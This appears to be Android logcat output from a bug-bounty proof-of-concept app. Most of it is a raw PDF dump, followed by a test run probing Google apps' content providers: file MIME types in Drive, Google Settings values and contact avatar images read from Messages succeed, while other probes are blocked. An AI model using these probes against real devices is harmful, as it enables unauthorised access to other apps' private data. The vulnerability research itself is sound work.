+07-10 06:34:18.744  8730  8730 D VRP_POC : /Identity
+07-10 06:34:18.744  8730  8730 D VRP_POC : /DW
+07-10 06:34:18.744  8730  8730 D VRP_POC : 556
+07-10 06:34:18.744  8730  8730 D VRP_POC : /W
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 750
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 35
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 36
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 666
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : 37
+07-10 06:34:18.744  8730  8730 D VRP_POC : 47
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 48
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 833
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : 49
+07-10 06:34:18.744  8730  8730 D VRP_POC : 67
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 68
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 556
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 556
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : 72
+07-10 06:34:18.744  8730  8730 D VRP_POC : 78
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 79
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 222
+07-10 06:34:18.744  8730  8730 D VRP_POC : 833
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : 81
+07-10 06:34:18.744  8730  8730 D VRP_POC : 85
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 86
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 500
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 25
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FontDescriptor
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FontName
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MUFUZY+ArialMT
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Flags
+07-10 06:34:18.744  8730  8730 D VRP_POC : 4
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FontBBox
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : -664
+07-10 06:34:18.744  8730  8730 D VRP_POC : -324
+07-10 06:34:18.744  8730  8730 D VRP_POC : 2000
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1005
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Ascent
+07-10 06:34:18.744  8730  8730 D VRP_POC : 728
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Descent
+07-10 06:34:18.744  8730  8730 D VRP_POC : -210
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ItalicAngle
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CapHeight
+07-10 06:34:18.744  8730  8730 D VRP_POC : 716
+07-10 06:34:18.744  8730  8730 D VRP_POC : /StemV
+07-10 06:34:18.744  8730  8730 D VRP_POC : 80
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FontFile2
+07-10 06:34:18.744  8730  8730 D VRP_POC : 26
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 27
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 274
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 28
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 13392
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Pages
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Kids
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 5
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : 12
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : 18
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Count
+07-10 06:34:18.744  8730  8730 D VRP_POC : 3
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : xref
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0 29
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000002 65535 f 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000016852 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000000 00000 f 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000016 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000142 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000243 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000408 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000765 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000655 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000674 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000693 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000731 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000000923 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001092 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001537 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001497 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001517 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002322 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001710 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000001879 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002163 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002123 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002143 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000016284 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002466 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000016613 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000002816 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000016810 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0000016830 00000 n 
+07-10 06:34:18.744  8730  8730 D VRP_POC : trailer
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Size
+07-10 06:34:18.744  8730  8730 D VRP_POC : 29
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Root
+07-10 06:34:18.744  8730  8730 D VRP_POC : 3
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Info
+07-10 06:34:18.744  8730  8730 D VRP_POC : 4
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : startxref
+07-10 06:34:18.744  8730  8730 D VRP_POC : 16925
+07-10 06:34:18.744  8730  8730 D VRP_POC : %%EOF
+07-10 06:34:18.744  8730  8730 D VRP_POC :   Test 5: Document enumeration attempts...
+07-10 06:34:18.746  8730  8730 D VRP_POC :   Test 6: getType (MIME leak without auth)...
+07-10 06:34:18.750  8730  8730 D VRP_POC : [VULN-TYPE] Web portal 1.xlsx -> application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+07-10 06:34:18.752  8730  8730 D VRP_POC : [VULN-TYPE] Web portal 4.xlsx -> application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+07-10 06:34:18.755  8730  8730 D VRP_POC : [VULN-TYPE] Untitled presentation.pdf -> application/pdf
+07-10 06:34:18.758  8730  8730 D VRP_POC : [VULN-TYPE] Prompt injection doc.pdf -> application/pdf
+07-10 06:34:18.760  8730  8730 D VRP_POC : [VULN-TYPE] websiteregister.pdf -> application/pdf
+07-10 06:34:18.762  8730  8730 D VRP_POC : [VULN-TYPE] bug bounty folder -> vnd.android.document/directory
+07-10 06:34:18.762  8730  8730 D VRP_POC : --- Drive Legacy call() Confused Deputy ---
+07-10 06:34:18.762  8730  8730 D VRP_POC : [NULL] Legacy call() returned null (method unrecognized or URI lookup failed)
+07-10 06:34:18.762  8730  8730 D VRP_POC : [NULL] Legacy call() with Drive SAF URI returned null
+07-10 06:34:18.762  8730  8730 D VRP_POC : --- Drive CrossAppStateProvider ---
+07-10 06:34:18.763  8730  8730 D VRP_POC : --- Gmail EmailProvider ---
+07-10 06:34:18.764  8730  8730 D VRP_POC : [BLOCKED] com.google.android.gmail.provider
+07-10 06:34:18.764  8730  8730 D VRP_POC : [BLOCKED] com.google.android.gm.email.provider
+07-10 06:34:18.764  8730  8730 D VRP_POC : --- Gmail/Messages FileProviders ---
+07-10 06:34:18.765  8730  8730 D VRP_POC : [BLOCKED] com.google.android.gm.fileprovider
+07-10 06:34:18.765  8730  8730 D VRP_POC : [BLOCKED] com.google.android.gm.composeimagefileprovider
+07-10 06:34:18.766  8730  8730 D VRP_POC : [BLOCKED] com.google.android.apps.messaging.fileprovider
+07-10 06:34:18.766  8730  8730 D VRP_POC : --- GMS Providers ---
+07-10 06:34:18.767  8730  8730 D VRP_POC : [NULL] Phenotype flags
+07-10 06:34:18.768  8730  8730 D VRP_POC : [UnsupportedOperationException] Auth accounts
+07-10 06:34:18.769  8730  8730 D VRP_POC : [NULL] Chimera modules
+07-10 06:34:18.769  8730  8730 D VRP_POC : --- Dialer PreferredSimFallback ---
+07-10 06:34:18.769  8730  8730 D VRP_POC : [BLOCKED] SimFallback: Permission Denial: opening provider com.android.dialer.preferredsim.impl.PreferredSimFallbackProvider from ProcessRecord...
+07-10 06:34:18.769  8730  8730 D VRP_POC : --- Photos PartnerContentProvider ---
+07-10 06:34:18.770  8730  8730 D VRP_POC : [NOFILE] Photos Partner (provider accessible, no file)
+07-10 06:34:18.774  8730  8730 D VRP_POC : [BLOCKED] Photos Partner call(): com.vrppoc is not authorized to access the content.
+07-10 06:34:18.774  8730  8730 D VRP_POC : --- Google Settings Partner ---
+07-10 06:34:18.777  8730  8730 D VRP_POC : [DATA] Google Settings: 18 rows
+07-10 06:34:18.777  8730  8730 D VRP_POC :   network_location_opt_in=1
+07-10 06:34:18.777  8730  8730 D VRP_POC :   client_id=android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   search_client_id=ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   search_a2_client_id=ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   chrome_client_id=ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   maps_client_id=gmm-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   youtube_client_id=mvapp-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   market_client_id=am-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   voicesearch_client_id=ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   playtx_client_id=play-ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   playax_client_id=play-ad-ms-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   program_client_id=pg-android-google
+07-10 06:34:18.777  8730  8730 D VRP_POC :   program2_client_id=pg2-android-google
+07-10 06:34:18.778  8730  8730 D VRP_POC :   program3_client_id=pg3-android-google
+07-10 06:34:18.778  8730  8730 D VRP_POC :   rsvd_a2_client_id=ms-android-google
+07-10 06:34:18.778  8730  8730 D VRP_POC :   rsvd_a3_client_id=ms-android-google
+07-10 06:34:18.778  8730  8730 D VRP_POC : --- Messages AvatarContentProvider ---
+07-10 06:34:18.790  8730  8730 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/contact_photo/1
+07-10 06:34:18.790  8730  8730 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 06:34:18.796  8730  8730 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/contact_photo/2
+07-10 06:34:18.796  8730  8730 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 06:34:18.801  8730  8730 D VRP_POC : [VULN] Avatar read 512 bytes: content://com.google.android.apps.messaging.shared.ui.avatar.AvatarContentProvider/avatar/1
+07-10 06:34:18.801  8730  8730 D VRP_POC :   Hex: 89504e470d0a1a0a0000000d49484452000000bd000000bd0806000000e6d77c
+07-10 06:34:18.806  8730  8730 D VRP_POC : [UnsupportedOperationException] Avatar query: query not supported
+07-10 06:34:18.806  8730  8730 D VRP_POC : --- Contacts/OtherContacts Providers ---
+07-10 06:34:18.807  8730  8730 D VRP_POC : [NULL] OtherContacts
+07-10 06:34:18.807  8730  8730 D VRP_POC : [NULL] Besties
+07-10 06:34:18.807  8730  8730 D VRP_POC : --- Photos SharouselContentProvider ---
+07-10 06:34:18.808  8730  8730 D VRP_POC : [NULL] Sharousel
+07-10 06:34:18.808  8730  8730 D VRP_POC : [NOFILE] Sharousel file (accessible)
+07-10 06:34:18.808  8730  8730 D VRP_POC : --- GMS Location/Emergency/Account ---
+07-10 06:34:18.808  8730  8730 D VRP_POC : [NULL] Location Reporting
+07-10 06:34:18.809  8730  8730 D VRP_POC : [IllegalArgumentException] Emergency Config: Unsupported URI: content://com.google.android.gms.thunderbird.config
+07-10 06:34:18.809  8730  8730 D VRP_POC : [NULL] Account State
+07-10 06:34:18.809  8730  8730 D VRP_POC : === ALL TESTS COMPLETE ===
